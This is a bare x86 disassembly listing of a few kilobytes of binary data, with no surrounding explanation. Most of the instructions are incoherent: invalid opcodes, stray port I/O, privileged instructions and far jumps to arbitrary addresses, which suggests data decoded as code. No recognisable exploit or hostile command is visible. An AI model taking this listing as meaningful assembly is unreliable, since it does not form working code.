  40fa9a:	call   0x4862eea8
  40fa9f:	dec    esi
  40faa0:	adc    ecx,edx
  40faa2:	push   ds
  40faa3:	push   edx
  40faa4:	jns    0x40fac8
  40faa6:	div    DWORD PTR [edi]
  40faa8:	fwait
  40faa9:	scas   al,BYTE PTR es:[edi]
  40faaa:	adc    edi,DWORD PTR [edx]
  40faac:	inc    ebp
  40faad:	test   al,0xad
  40faaf:	jle    0x40fa88
  40fab1:	sbb    eax,DWORD PTR [edi]
  40fab3:	(bad)  
  40fab4:	cmp    al,0x34
  40fab6:	add    DWORD PTR [edx],0x23
  40fab9:	(bad)  
  40faba:	fisub  DWORD PTR [ebx]
  40fabc:	dec    edi
  40fabd:	adc    DWORD PTR [esi-0x35],esi
  40fac0:	popa   
  40fac1:	mov    ah,al
  40fac3:	jbe    0x40fac5
  40fac5:	(bad)  
  40fac6:	popa   
  40fac7:	fnsave [esi+0x20b35fb7]
  40facd:	dec    edx
  40face:	mul    DWORD PTR [ebx+0x17cf0fdc]
  40fad4:	ja     0x40fa69
  40fad6:	mov    dh,bh
  40fad8:	leave  
  40fad9:	in     eax,dx
  40fada:	mov    ebp,0xd380edb1
  40fadf:	sbb    eax,0xa0856e4e
  40fae4:	sub    al,0xf9
  40fae6:	mov    ah,0xa6
  40fae8:	dec    eax
  40fae9:	jle    0x40fada
  40faeb:	pop    eax
  40faec:	iret   
  40faed:	lds    esp,FWORD PTR [edi+0x5]
  40faf0:	lea    eax,[eax-0x5a]
  40faf3:	jg     0x40faef
  40faf5:	dec    ebx
  40faf6:	or     eax,0x2929c761
  40fafb:	aam    0x73
  40fafd:	xlat   BYTE PTR ds:[ebx]
  40fafe:	xchg   esp,esp
  40fb00:	and    BYTE PTR [esi-0x1d],ah
  40fb03:	jo     0x40fb31
  40fb05:	popf   
  40fb06:	pop    edi
  40fb07:	mov    esi,0x1aa8681f
  40fb0c:	add    eax,0xfa8ae93b
  40fb11:	in     eax,0xa
  40fb13:	in     eax,0xcb
  40fb15:	push   cs
  40fb16:	xchg   esi,eax
  40fb17:	iret   
  40fb18:	out    0x31,eax
  40fb1a:	hlt    
  40fb1b:	out    dx,eax
  40fb1c:	jbe    0x40fb05
  40fb1e:	pop    esp
  40fb1f:	inc    eax
  40fb20:	(bad)  
  40fb21:	mov    ebp,0xc47ca226
  40fb26:	test   DWORD PTR [edx],eax
  40fb28:	mov    ebx,0xe7be430d
  40fb2d:	adc    eax,0xf5250f82
  40fb32:	clc    
  40fb33:	mov    ss,WORD PTR [ecx+0x3a]
  40fb36:	xlat   BYTE PTR ds:[ebx]
  40fb37:	mov    ecx,0x394661
  40fb3c:	gs xor al,0x61
  40fb3f:	shr    DWORD PTR [eax-0x48],1
  40fb42:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fb43:	int3   
  40fb44:	loop   0x40fb19
  40fb46:	and    al,0x7f
  40fb48:	rcl    BYTE PTR [ebx],cl
  40fb4a:	ret    0x1780
  40fb4d:	xor    ah,BYTE PTR [edi]
  40fb4f:	call   0xf0485e8b
  40fb54:	xchg   ebx,ecx
  40fb56:	scas   eax,DWORD PTR es:[edi]
  40fb57:	adc    DWORD PTR [eax+0x2957ac4f],edx
  40fb5d:	cmc    
  40fb5e:	cdq    
  40fb5f:	xor    DWORD PTR [edi+0x33dcbfb9],eax
  40fb65:	mov    ebx,0x54aba62a
  40fb6a:	sub    eax,0xd70888ca
  40fb6f:	xchg   edi,edx
  40fb71:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fb72:	xor    esi,DWORD PTR ds:0xf39dc81a
  40fb78:	in     eax,dx
  40fb79:	out    dx,al
  40fb7a:	mov    ds:0x87868c3e,eax
  40fb7f:	lahf   
  40fb80:	pop    esp
  40fb81:	mov    ds:0x11d76515,al
  40fb86:	adc    eax,0x82b470e3
  40fb8b:	out    0x70,eax
  40fb8d:	int    0xdb
  40fb8f:	jle    0x40fb5a
  40fb91:	stos   DWORD PTR es:[edi],eax
  40fb92:	popa   
  40fb93:	inc    esp
  40fb94:	mov    eax,0x79e84aec
  40fb99:	mov    ss,ebx
  40fb9b:	mov    ecx,0x29f277a2
  40fba0:	int3   
  40fba1:	je     0x40fc1e
  40fba3:	mov    esp,0x308a554d
  40fba8:	gs popa 
  40fbaa:	lds    esp,FWORD PTR gs:[edx]
  40fbad:	jp     0x40fc0f
  40fbaf:	inc    esp
  40fbb0:	dec    esi
  40fbb1:	mov    esp,DWORD PTR [esp+edx*4-0x4aae0805]
  40fbb8:	push   ss
  40fbb9:	inc    ecx
  40fbba:	dec    eax
  40fbbb:	pop    edx
  40fbbc:	aad    0x94
  40fbbe:	pop    edi
  40fbbf:	inc    ecx
  40fbc0:	mov    DWORD PTR [ebx-0x7b],0x70358100
  40fbc7:	stos   BYTE PTR es:[edi],al
  40fbc8:	ds out 0x61,al
  40fbcb:	outs   dx,BYTE PTR ds:[esi]
  40fbcc:	repnz mov ah,0x2e
  40fbcf:	mov    ecx,eax
  40fbd1:	mov    edi,0x584dbbf2
  40fbd6:	in     eax,0x28
  40fbd8:	jno    0x40fb69
  40fbda:	cmc    
  40fbdb:	hlt    
  40fbdc:	sbb    eax,0x5a6b627c
  40fbe1:	xchg   BYTE PTR [ecx],ch
  40fbe3:	sub    ecx,DWORD PTR [ecx+0x7ba161d]
  40fbe9:	mov    DWORD PTR [esi+0x779971ba],esp
  40fbef:	clc    
  40fbf0:	pop    ss
  40fbf1:	out    0xb3,eax
  40fbf3:	xchg   ecx,eax
  40fbf4:	inc    ebx
  40fbf5:	and    edx,ecx
  40fbf7:	jg     0x40fbdc
  40fbf9:	shl    edx,1
  40fbfb:	push   es
  40fbfc:	sub    al,0x15
  40fbfe:	shl    BYTE PTR [edx],cl
  40fc00:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fc01:	in     al,0x6f
  40fc03:	jno    0x40fba2
  40fc05:	addr16 pop eax
  40fc07:	sub    al,0xe6
  40fc09:	sbb    al,0xaf
  40fc0b:	ss jp  0x40fc62
  40fc0e:	cs popf 
  40fc10:	lea    edx,[edi+0x5e]
  40fc13:	sub    ebx,edi
  40fc15:	xchg   edi,eax
  40fc16:	sbb    esp,DWORD PTR [edi+0x5aaee160]
  40fc1c:	mov    ch,0x0
  40fc1e:	or     esi,0x32
  40fc21:	mov    WORD PTR [edi-0x55],?
  40fc24:	jmp    0xc72:0x4242523e
  40fc2b:	(bad)  
  40fc2c:	test   al,0xdc
  40fc2e:	loopne 0x40fc52
  40fc30:	cwde   
  40fc31:	xchg   ebx,eax
  40fc32:	hlt    
  40fc33:	mov    ?,WORD PTR [edx+0x10cc52dd]
  40fc39:	mov    ebx,0x27ee594
  40fc3e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fc3f:	ins    DWORD PTR es:[edi],dx
  40fc40:	mov    esi,0xb3ac3232
  40fc45:	nop
  40fc46:	test   dl,bl
  40fc48:	aaa    
  40fc49:	repnz lods eax,DWORD PTR ds:[esi]
  40fc4b:	dec    edx
  40fc4c:	into   
  40fc4d:	cmc    
  40fc4e:	in     al,dx
  40fc4f:	jmp    0xb274:0x41c8e48d
  40fc56:	loope  0x40fc00
  40fc58:	es mov ch,0x1
  40fc5b:	(bad)  
  40fc5c:	rol    ch,cl
  40fc5e:	ja     0x40fbfe
  40fc60:	and    eax,0xe1ac14fe
  40fc65:	ds pop ebx
  40fc67:	ret    0xc0b4
  40fc6a:	test   eax,0xe641ca9a
  40fc6f:	cwde   
  40fc70:	ret    
  40fc71:	stos   BYTE PTR es:[edi],al
  40fc72:	pop    edx
  40fc73:	xchg   esi,eax
  40fc74:	mov    BYTE PTR [esp+esi*4],cl
  40fc77:	imul   ebx,DWORD PTR [eax+0x67],0xefc85fd3
  40fc7e:	ret    
  40fc7f:	(bad)  
  40fc80:	jbe    0x40fce6
  40fc82:	pop    ebx
  40fc83:	push   ds
  40fc84:	jne    0x40fc29
  40fc86:	mov    dl,0x3f
  40fc88:	mov    DWORD PTR [eax+0x9],eax
  40fc8b:	or     edi,eax
  40fc8d:	jno    0x40fc98
  40fc8f:	jge    0x40fcae
  40fc91:	add    edi,ebx
  40fc93:	push   ds
  40fc94:	jne    0x40fc67
  40fc96:	rcl    ecx,1
  40fc98:	test   al,0xe8
  40fc9a:	push   esi
  40fc9b:	pop    ss
  40fc9c:	rol    DWORD PTR [edx],cl
  40fc9e:	mov    WORD PTR es:[eax],ss
  40fca1:	and    eax,0xd676bc50
  40fca6:	mov    eax,ds:0xbd230093
  40fcab:	mov    eax,ds:0x94452160
  40fcb0:	test   BYTE PTR [esi-0x38bb888b],dl
  40fcb6:	pusha  
  40fcb7:	addr16 sub eax,0x7f8d4298
  40fcbd:	mov    bl,0xd9
  40fcbf:	xor    BYTE PTR [edi+0xc43e2e],dh
  40fcc5:	inc    ebx
  40fcc6:	leave  
  40fcc7:	sub    dh,BYTE PTR [ebp+0x57]
  40fcca:	sar    BYTE PTR [edx],cl
  40fccc:	in     eax,0x81
  40fcce:	add    esi,ecx
  40fcd0:	add    eax,ecx
  40fcd2:	jmp    0x40ffa1
  40fcd7:	lock sub DWORD PTR [ebx-0x20],esp
  40fcdb:	arpl   WORD PTR [eax+0x71],si
  40fcde:	sub    ebp,esi
  40fce0:	scas   eax,DWORD PTR es:[edi]
  40fce1:	ret    
  40fce2:	sar    DWORD PTR [eax],0x2e
  40fce5:	or     al,0x8f
  40fce7:	mov    ecx,0xac7e7eb3
  40fcec:	jl     0x40fd6c
  40fcee:	jle    0x40fd3c
  40fcf0:	test   DWORD PTR [edi-0x5a9223a1],edi
  40fcf6:	lahf   
  40fcf7:	push   0xd205ffe3
  40fcfc:	jns    0x40fd3f
  40fcfe:	test   eax,0x2ee6cef6
  40fd03:	cmp    al,0x15
  40fd05:	fwait
  40fd06:	push   0x638e11ee
  40fd0b:	mov    ecx,0xdfbe5ae5
  40fd10:	dec    esp
  40fd11:	shr    BYTE PTR [eax+0x32],1
  40fd14:	(bad)  
  40fd15:	mov    eax,0x625986c3
  40fd1a:	ins    DWORD PTR es:[edi],dx
  40fd1b:	xchg   esi,eax
  40fd1c:	ret    0x28af
  40fd1f:	shl    esp,cl
  40fd21:	xchg   edi,eax
  40fd22:	jno    0x40fd40
  40fd24:	sub    edx,ebx
  40fd26:	lock jno 0x40fd8b
  40fd29:	jg     0x40fd5d
  40fd2b:	scas   eax,DWORD PTR es:[edi]
  40fd2c:	xor    BYTE PTR [ebx+edx*4-0x28],cl
  40fd30:	lahf   
  40fd31:	cli    
  40fd32:	add    BYTE PTR [edi-0x64301ff7],dl
  40fd38:	jbe    0x40fd16
  40fd3a:	lahf   
  40fd3b:	cmp    cl,dl
  40fd3d:	out    dx,eax
  40fd3e:	(bad)  
  40fd3f:	cdq    
  40fd40:	xchg   esp,eax
  40fd41:	mov    al,ds:0xd48ef8b4
  40fd46:	bound  edi,QWORD PTR [ecx+0x342d95e7]
  40fd4c:	xor    eax,0x74930198
  40fd51:	add    al,0x91
  40fd53:	push   edx
  40fd54:	jno    0x40fdb9
  40fd56:	pop    edi
  40fd57:	aad    0x95
  40fd59:	mov    ebp,0x5eff7360
  40fd5e:	leave  
  40fd5f:	pop    ds
  40fd60:	aas    
  40fd61:	repnz daa 
  40fd63:	(bad)  
  40fd64:	dec    edi
  40fd65:	mov    ds:0xf9c9f5bd,al
  40fd6a:	sub    eax,esp
  40fd6c:	mov    eax,ds:0xafde5859
  40fd71:	cs ss dec edx
  40fd74:	adc    BYTE PTR [ecx],0x28
  40fd77:	pop    ecx
  40fd78:	fld    TBYTE PTR [edi]
  40fd7a:	xlat   BYTE PTR ds:[ebx]
  40fd7b:	and    dh,BYTE PTR [edx-0xb]
  40fd7e:	int    0x25
  40fd80:	push   ebx
  40fd81:	ret    
  40fd82:	xchg   ebp,eax
  40fd83:	ins    DWORD PTR es:[edi],dx
  40fd84:	in     al,0x1b
  40fd86:	sbb    eax,0xef9deac1
  40fd8b:	add    esi,DWORD PTR [ebp+0x11]
  40fd8e:	mov    eax,0x5ef668e6
  40fd93:	in     eax,0xa2
  40fd95:	lods   eax,DWORD PTR ds:[esi]
  40fd96:	pop    ebx
  40fd97:	pop    ecx
  40fd98:	sbb    BYTE PTR [esi-0x4c623538],ch
  40fd9e:	bound  eax,QWORD PTR ds:0x39eccaec
  40fda4:	dec    eax
  40fda5:	jl     0x40fd2c
  40fda7:	xchg   ecx,eax
  40fda8:	sub    esp,edi
  40fdaa:	div    BYTE PTR [esi]
  40fdac:	and    edi,DWORD PTR [edi]
  40fdae:	cs scas eax,DWORD PTR es:[edi]
  40fdb0:	adc    al,0xbc
  40fdb2:	pop    edx
  40fdb3:	fcmovnbe st,st(5)
  40fdb5:	dec    edi
  40fdb6:	pop    edi
  40fdb7:	mov    edi,0x49fccd49
  40fdbc:	mov    bh,0x8
  40fdbe:	aas    
  40fdbf:	dec    ecx
  40fdc0:	adc    DWORD PTR [eax+edx*8],esp
  40fdc3:	in     eax,dx
  40fdc4:	xchg   ebx,eax
  40fdc5:	cmp    dl,dh
  40fdc7:	pushf  
  40fdc8:	icebp  
  40fdc9:	sub    dl,BYTE PTR [ecx+0x22f453fc]
  40fdcf:	xor    edi,DWORD PTR [eax+ebx*2+0x142cbda0]
  40fdd6:	xor    BYTE PTR [esi-0x4f54b9b8],ah
  40fddc:	ins    BYTE PTR es:[edi],dx
  40fddd:	sbb    ecx,0xffffff90
  40fde0:	aas    
  40fde1:	xor    BYTE PTR [ecx+0x278649c8],bh
  40fde7:	mov    eax,0xe04dbc8d
  40fdec:	inc    ecx
  40fded:	popa   
  40fdee:	xchg   esi,eax
  40fdef:	inc    ebx
  40fdf0:	adc    al,dl
  40fdf2:	xor    eax,0xab7610dd
  40fdf7:	stos   BYTE PTR es:[edi],al
  40fdf8:	scas   al,BYTE PTR es:[edi]
  40fdf9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fdfa:	push   ss
  40fdfb:	out    0x7e,eax
  40fdfd:	jmp    0xfa82691c
  40fe02:	inc    esi
  40fe03:	das    
  40fe04:	ret    0x48fb
  40fe07:	leave  
  40fe08:	call   0x99372fcf
  40fe0d:	call   0x9a03b2b6
  40fe12:	ins    BYTE PTR es:[edi],dx
  40fe13:	test   BYTE PTR [ebx-0x15a6fa2f],ah
  40fe19:	call   0xcfb1570e
  40fe1e:	xchg   ebx,eax
  40fe1f:	mov    edi,0x31cd1776
  40fe24:	or     DWORD PTR [ebx+0x42],edi
  40fe27:	hlt    
  40fe28:	or     BYTE PTR [esi+0x400e7ad6],ah
  40fe2e:	gs xchg esp,eax
  40fe30:	fs in  al,dx
  40fe32:	adc    DWORD PTR [ebp+ebp*2-0x2a],0x22
  40fe37:	mov    eax,0x9367e3fd
  40fe3c:	push   0x5b5c233f
  40fe41:	xor    al,0x98
  40fe44:	fcom   st(6)
  40fe46:	mov    ds:0xc4c781eb,al
  40fe4b:	fimul  DWORD PTR [eax-0x2f]
  40fe4e:	std    
  40fe4f:	mov    bl,0x6
  40fe51:	ret    0x8a92
  40fe54:	mov    edi,0xeaa3e87d
  40fe59:	inc    ebp
  40fe5a:	adc    al,0xe7
  40fe5c:	sbb    al,0x12
  40fe5e:	arpl   sp,si
  40fe60:	pop    ebp
  40fe61:	scas   al,BYTE PTR es:[edi]
  40fe62:	mov    eax,0x8784e242
  40fe67:	in     al,0xd9
  40fe69:	mov    al,0x81
  40fe6b:	cmp    cl,BYTE PTR [ecx]
  40fe6d:	jns    0x40fecf
  40fe6f:	rcr    DWORD PTR [eax+0x54861a4d],1
  40fe75:	daa    
  40fe76:	pop    ebx
  40fe77:	(bad)  
  40fe79:	xchg   ebx,eax
  40fe7a:	fiadd  DWORD PTR [ebx+0x157c30c1]
  40fe81:	mov    ah,0x45
  40fe83:	jmp    DWORD PTR [edi+ecx*8+0x54]
  40fe87:	sub    al,0x13
  40fe89:	into   
  40fe8a:	or     BYTE PTR [edx+0x71],dh
  40fe8d:	jg     0x40fe2c
  40fe8f:	mov    DWORD PTR ds:0x7eda6aa1,0x27e5a80a
  40fe99:	xchg   esp,eax
  40fe9a:	stos   BYTE PTR es:[edi],al
  40fe9b:	jmp    0x5611d97c
  40fea0:	loope  0x40feb8
  40fea2:	fstp   TBYTE PTR [ecx+0x20]
  40fea5:	add    bl,dh
  40fea7:	pop    ecx
  40fea8:	and    BYTE PTR [ecx-0x41f7d157],dh
  40feae:	mov    eax,0x5c881635
  40feb3:	call   0x76ea923d
  40feb8:	sbb    BYTE PTR [edx+0x2],bh
  40febb:	mov    BYTE PTR [ecx+0x53],ah
  40febe:	test   eax,0xeb11aac4
  40fec3:	adc    BYTE PTR [edi+eiz*1+0x79],bh
  40fec7:	mov    dl,0x29
  40fec9:	add    eax,0xbf77d0d0
  40fece:	jbe    0x40fe63
  40fed0:	fwait
  40fed1:	jae    0x40feeb
  40fed3:	jmp    0x47a0416d
  40fed8:	sahf   
  40fed9:	stc    
  40feda:	mov    bh,0x34
  40fedc:	(bad)  
  40fedd:	cmp    eax,0xdb75884b
  40fee2:	jns    0x40fe6e
  40fee4:	inc    edx
  40fee5:	bswap  esi
  40fee7:	rol    ecx,0x6f
  40feea:	mov    eax,0xa261f5a9
  40feef:	in     eax,0x40
  40fef1:	out    dx,eax
  40fef2:	mov    esi,0x91da9089
  40fef7:	mov    esp,0xd7061cf7
  40fefc:	or     DWORD PTR [edi+eiz*2-0x40],eax
  40ff00:	ja     0x40ff32
  40ff02:	sub    ecx,ebp
  40ff04:	cli    
  40ff05:	xchg   edx,eax
  40ff06:	sub    ah,BYTE PTR [edi]
  40ff08:	pop    ebp
  40ff09:	push   ss
  40ff0a:	retf   0x9816
  40ff0d:	cmp    DWORD PTR [ecx+0x8],ecx
  40ff10:	ja     0x40fed8
  40ff12:	daa    
  40ff13:	dec    ebp
  40ff14:	hlt    
  40ff15:	push   ds
  40ff16:	mov    ah,0x31
  40ff18:	pop    ecx
  40ff19:	popa   
  40ff1a:	sbb    edi,0x1f
  40ff1d:	fcmove st,st(3)
  40ff1f:	xor    al,0xc2
  40ff21:	lock sbb ch,BYTE PTR [esi-0x24]
  40ff25:	add    ebx,ebx
  40ff27:	mov    ch,0xb0
  40ff29:	je     0x40ff4d
  40ff2b:	ror    ecx,0x6
  40ff2e:	jns    0x40ff74
  40ff30:	aam    0x1f
  40ff32:	push   eax
  40ff33:	test   eax,0x43c61a50
  40ff38:	fnstsw WORD PTR [esi]
  40ff3a:	(bad)  
  40ff3b:	jb     0x40ff62
  40ff3d:	inc    edx
  40ff3e:	out    dx,al
  40ff3f:	sub    esp,DWORD PTR [eax+edx*1-0x23]
  40ff43:	mov    edx,0xbe3570c1
  40ff48:	gs lock cmp al,0x18
  40ff4c:	into   
  40ff4d:	inc    esi
  40ff4e:	jno    0x40ff66
  40ff50:	adc    eax,0xd8e6a375
  40ff55:	mov    ds:0xb2be42ff,al
  40ff5a:	cwde   
  40ff5b:	jecxz  0x40ffab
  40ff5d:	pop    esp
  40ff5e:	out    dx,al
  40ff5f:	mov    esp,0x56e55663
  40ff64:	pushf  
  40ff65:	dec    esp
  40ff66:	sub    edi,edi
  40ff68:	mov    edx,0xf33c1541
  40ff6d:	int3   
  40ff6e:	adc    al,0x2a
  40ff70:	mov    esi,0xd757404a
  40ff75:	mov    ah,0xf9
  40ff77:	pause  
  40ff79:	(bad)  
  40ff7a:	(bad)  
  40ff7b:	mov    dh,0xe8
  40ff7d:	xchg   DWORD PTR [edi],eax
  40ff7f:	jne    0x40ff53
  40ff81:	pop    esi
  40ff82:	jmp    0xeb50:0x683b4b74
  40ff89:	nop
  40ff8a:	ds cmp eax,0x53b9f9e0
  40ff90:	les    esp,FWORD PTR [esi]
  40ff92:	mov    ah,0x6e
  40ff94:	jb     0x40ff6d
  40ff96:	jo     0x40ff54
  40ff98:	mov    esi,DWORD PTR [edx]
  40ff9a:	imul   ebp,ebp,0xffffff8d
  40ff9d:	sbb    DWORD PTR [edi-0x50f08c9c],edi
  40ffa3:	(bad)  
  40ffa4:	mov    esi,DWORD PTR [ebp+0xc]
  40ffa7:	mov    DWORD PTR ds:0x433723,0x6048
  40ffb1:	cmp    esi,eax
  40ffb3:	jne    0x4102bc
  40ffb9:	mov    eax,DWORD PTR [ebp-0x4]
  40ffbc:	sbb    DWORD PTR ds:0x4337e7,0x14e6
  40ffc6:	jmp    0x410295
  40ffcb:	inc    eax
  40ffcc:	sbb    BYTE PTR [esi+0x407076f6],dh
  40ffd2:	test   al,0x4a
  40ffd4:	add    eax,0xcbfe39b1
  40ffd9:	dec    esp
  40ffda:	pop    eax
  40ffdb:	idiv   DWORD PTR [esi+0x7cac7e7e]
  40ffe1:	jle    0x410061
  40ffe3:	aad    0x43
  40ffe5:	repz icebp 
  40ffe7:	jns    0x40ffdf
  40ffe9:	int3   
  40ffea:	jae    0x40ff9c
  40ffec:	xor    edi,DWORD PTR [ebp-0x753b4a1c]
  40fff2:	enter  0xfd46,0x35
  40fff6:	out    dx,al
  40fff7:	lahf   
  40fff8:	jb     0x40ff9f
  40fffa:	push   0x40
  40fffc:	adc    al,0x76
  40fffe:	sub    DWORD PTR [edi+0x4029b793],0x6afee36b
  410008:	fcomp  DWORD PTR [ebx+0x52898fb3]
  41000e:	mov    cl,BYTE PTR [esi]
  410010:	enter  0x9a91,0xa5
  410014:	int    0xb5
  410016:	(bad)  
  410018:	pop    ds
  410019:	or     ebp,DWORD PTR [edx]
  41001b:	retf   
  41001c:	retf   0x4a92
  41001f:	es daa 
  410021:	enter  0xf101,0xf7
  410025:	adc    BYTE PTR [ebx-0x34],dl
  410028:	xor    eax,0xe4ec2a85
  41002d:	cmp    DWORD PTR [ecx-0x15],ebp
  410030:	stos   BYTE PTR es:[edi],al
  410031:	test   eax,0xa3504bf9
  410036:	push   ss
  410037:	dec    esi
  410038:	scas   eax,DWORD PTR es:[edi]
  410039:	sbb    ebp,ebp
  41003b:	push   ebp
  41003c:	push   esi
  41003d:	fild   QWORD PTR [ecx]
  41003f:	out    0x2,eax
  410041:	cmp    BYTE PTR [edi+0x53],ch
  410044:	stos   DWORD PTR es:[edi],eax
  410045:	pop    edi
  410046:	pop    ss
  410047:	xor    ecx,DWORD PTR [esi-0x15da9658]
  41004d:	loop   0x410093
  41004f:	jb     0x40ffe9
  410051:	mov    esp,0x987d5a94
  410056:	popa   
  410057:	scas   eax,DWORD PTR es:[edi]
  410058:	mov    es,WORD PTR [edx+ecx*1-0x55]
  41005c:	inc    ebx
  41005d:	fs cs jns 0x41001d
  410061:	mov    eax,0xcfdaf94a
  410066:	mov    WORD PTR [esp+edi*8+0x3b],cs
  41006a:	repz jmp 0xe9ce2cd
  410070:	or     eax,0x6d6409ea
  410075:	add    ch,BYTE PTR [eax]
  410077:	rol    DWORD PTR [ecx+eax*1],0x31
  41007b:	or     ebp,ebp
  41007d:	or     cl,BYTE PTR [eax]
  41007f:	dec    ebx
  410080:	jno    0x410031
  410082:	jbe    0x41008a
  410084:	(bad)  
  410085:	in     al,dx
  410086:	jmp    FWORD PTR [edi-0xc43f5e8]
  41008c:	leave  
  41008d:	xor    eax,DWORD PTR [ebx+0x152d2e9a]
  410093:	fnsave [ecx-0x3d3c3c1e]
  410099:	iret   
  41009a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41009b:	xchg   esi,eax
  41009c:	gs aam 0x65
  41009f:	test   bl,cl
  4100a1:	add    eax,0x99e9c774
  4100a6:	mov    al,0x7c
  4100a8:	das    
  4100a9:	in     eax,0x5b
  4100ab:	or     eax,0xd93fa6f4
  4100b0:	xchg   ebx,eax
  4100b1:	lds    esp,FWORD PTR ds:[ecx+0x6a]
  4100b5:	(bad)  
  4100b6:	push   es
  4100b7:	mov    ds:0x2a810be3,al
  4100bc:	jne    0x410096
  4100be:	push   edi
  4100bf:	ficomp WORD PTR [ecx-0x3a]
  4100c2:	imul   ecx,DWORD PTR [eax],0x195db41a
  4100c8:	hlt    
  4100c9:	mov    dh,0x3d
  4100cb:	imul   edi,DWORD PTR [ecx+0x70],0xffffffc5
  4100cf:	lods   al,BYTE PTR ds:[esi]
  4100d0:	es nop
  4100d2:	inc    edx
  4100d3:	dec    esi
  4100d4:	xchg   DWORD PTR [esi-0x49],edx
  4100d7:	fs jo  0x4100c9
  4100da:	or     eax,0xe7d1609f
  4100df:	cmp    ecx,DWORD PTR [edi]
  4100e1:	mov    ds:0x7dd80209,al
  4100e6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4100e7:	sbb    edx,DWORD PTR [eax+0x74]
  4100ea:	ret    0x62cb
  4100ed:	push   eax
  4100ee:	movaps xmm0,xmm4
  4100f1:	data16 and dh,BYTE PTR [edx+0x18]
  4100f5:	cmp    BYTE PTR [eax+0x5205b78b],bh
  4100fb:	xor    eax,ebp
  4100fd:	mov    eax,ds:0xe29de9b5
  410102:	(bad)  
  410103:	(bad)  
  410104:	jmp    0x41016e
  410106:	iret   
  410107:	stos   DWORD PTR es:[edi],eax
  410108:	xchg   DWORD PTR [ebp-0x46e321f7],ebx
  41010e:	cmp    eax,DWORD PTR [edx*1+0x7a309c0a]
  410115:	cmp    ebx,DWORD PTR [eiz*8-0xd04b87d]
  41011c:	mov    ebp,0x6f11e680
  410121:	test   eax,0x3ac2bff4
  410126:	mov    eax,0x5f7789b2
  41012b:	jecxz  0x4100cc
  41012d:	mov    al,ds:0xfc38a51c
  410132:	jmp    0x41015e
  410134:	mov    bh,0x38
  410136:	push   edx
  410137:	or     al,cl
  410139:	xchg   di,cx
  41013c:	out    dx,al
  41013d:	mov    al,0x4
  41013f:	sub    edi,esi
  410141:	adc    al,0x19
  410143:	sub    eax,0xaa91b54
  410148:	xchg   ebx,eax
  410149:	aad    0x6d
  41014b:	jl     0x4101c7
  41014d:	fneni(8087 only) 
  41014f:	scas   eax,DWORD PTR es:[edi]
  410150:	cld    
  410151:	inc    eax
  410152:	inc    eax
  410153:	mov    eax,0x73df35b7
  410158:	push   cs
  410159:	test   BYTE PTR [ebp-0x362179d8],ah
  41015f:	dec    ebp
  410160:	dec    esi
  410161:	shl    BYTE PTR [edx],1
  410163:	mov    dl,0xf
  410165:	ret    
  410166:	mov    edx,0xa1a97995
  41016b:	jmp    0xbc33:0x642ac8e0
  410172:	cmp    DWORD PTR [ecx],0x199dd08
  410178:	add    al,0xfa
  41017a:	push   ecx
  41017b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41017c:	cmc    
  41017d:	mov    ebp,0x70129ac
  410182:	gs mov bh,0x5a
  410185:	mov    eax,ds:0x2742b993
  41018a:	repnz out 0xcb,eax
  41018d:	mov    esi,0x92f3926e
  410192:	dec    esi
  410193:	sbb    DWORD PTR ds:0x2fc22522,0xffffff87
  41019a:	neg    edi
  41019c:	sbb    ah,BYTE PTR [edx]
  41019e:	das    
  41019f:	repnz adc edx,0x44
  4101a3:	cmp    cl,BYTE PTR [ebx-0x4d0f8658]
  4101a9:	retf   
  4101aa:	xchg   BYTE PTR [edi+0x78c5aced],bh
  4101b0:	inc    ebp
  4101b1:	out    0x59,al
  4101b3:	jmp    0xa01f:0x875eba3a
  4101ba:	(bad)  
  4101bb:	and    al,0xa1
  4101bd:	xchg   DWORD PTR ds:0x95b17cc1,eax
  4101c3:	lods   al,BYTE PTR ds:[esi]
  4101c4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4101c5:	push   cs
  4101c6:	sti    
  4101c7:	or     BYTE PTR ds:0x38313e24,bh
  4101cd:	and    al,0x33
  4101cf:	push   edi
  4101d0:	fcomp  QWORD PTR [edx+0x40d6e65e]
  4101d6:	cli    
  4101d7:	push   edx
  4101d8:	jb     0x410174
  4101da:	aaa    
  4101db:	les    eax,FWORD PTR [ecx-0x39]
  4101de:	(bad)  
  4101df:	retf   0x8b5f
  4101e2:	daa    
  4101e3:	es into 
  4101e5:	and    esi,DWORD PTR [ebx+esi*1]
  4101e8:	out    dx,eax
  4101e9:	enter  0x684c,0x47
  4101ed:	fs push es
  4101ef:	imul   ebp,eax,0x2b
  4101f2:	sub    eax,edx
  4101f4:	jecxz  0x410275
  4101f6:	push   esi
  4101f7:	test   al,ah
  4101f9:	cli    
  4101fa:	mov    dh,0x33
  4101fc:	inc    eax
  4101fd:	jp     0x4101e7
  4101ff:	add    DWORD PTR [esi-0x50aebe94],esi
  410205:	push   edi
  410206:	dec    ecx
  410207:	aam    0x5a
  410209:	jmp    0x410265
  41020b:	jecxz  0x410258
  41020d:	out    dx,eax
  41020e:	xor    al,0x90
  410210:	xor    al,0xf2
  410212:	popa   
  410213:	push   ss
  410214:	cmp    BYTE PTR [ebp-0x3a198a60],dh
  41021a:	outs   dx,BYTE PTR ds:[esi]
  41021b:	sub    dh,BYTE PTR [eax]
  41021d:	add    eax,0x813c0a15
  410222:	jne    0x410260
  410224:	xchg   edx,eax
  410225:	in     eax,dx
  410226:	mov    DWORD PTR [ecx+edi*2-0x56],esi
  41022a:	sbb    al,0x95
  41022c:	cwde   
  41022d:	dec    eax
  41022e:	hlt    
  41022f:	dec    ecx
  410230:	push   eax
  410231:	ins    DWORD PTR es:[edi],dx
  410232:	mov    ecx,DWORD PTR [ebx]
  410234:	mov    eax,ds:0xead0b958
  410239:	push   ecx
  41023a:	nop
  41023b:	xor    ecx,esp
  41023d:	mov    bl,dl
  41023f:	in     eax,0x1
  410241:	(bad)  
  410242:	jp     0x4101d4
  410244:	aam    0xf4
  410246:	jecxz  0x41024d
  410248:	cs jb  0x410263
  41024b:	push   ds
  41024c:	mov    eax,0x378614b1
  410251:	dec    BYTE PTR [esi+0x31c8df43]
  410257:	int    0x6c
  410259:	aam    0x9
